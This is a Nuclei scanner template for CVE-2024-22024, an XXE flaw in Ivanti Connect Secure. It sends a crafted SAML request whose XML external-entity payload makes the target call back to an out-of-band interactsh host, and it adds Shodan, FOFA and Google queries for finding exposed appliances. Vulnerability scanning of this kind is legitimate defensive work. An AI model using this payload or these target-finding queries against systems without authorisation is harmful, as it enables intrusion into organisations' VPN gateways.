http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    part: body
    type: word
    words:
    - /dana-na/
    - WriteCSS
  matchers-condition: and
  raw:
  - 'POST /dana-na/auth/saml-sso.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    SAMLRequest={{base64(payload)}}

    '
id: CVE-2024-22024
info:
  author: watchTowr
  classification:
    epss-percentile: 0.99924
    epss-score: 0.94249
  description: 'Ivanti Connect Secure is vulnerable to XXE (XML External Entity) injection.

    '
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access to sensitive information or remote code execution.

    '
  metadata:
    fofa-query:
    - body="welcome.cgi?p=logo"
    - title="ivanti connect secure"
    google-query: intitle:"ivanti connect secure"
    max-request: 1
    product: connect_secure
    shodan-query:
    - html:"welcome.cgi?p=logo"
    - http.title:"ivanti connect secure"
    - http.html:"welcome.cgi?p=logo"
    vendor: ivanti
  name: Ivanti Connect Secure - XXE
  reference:
  - https://labs.watchtowr.com/are-we-now-part-of-ivanti/
  - https://twitter.com/h4x0r_dz/status/1755849867149103106/photo/1
  remediation: 'Apply the latest security patches or updates provided by Ivanti to
    fix the XXE vulnerability.

    '
  severity: high
  tags: cve,cve2024,xxe,ivanti,vkev,vuln
variables:
  payload: <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % watchTowr SYSTEM "http://{{interactsh-url}}/x">
    %watchTowr;]><r></r>
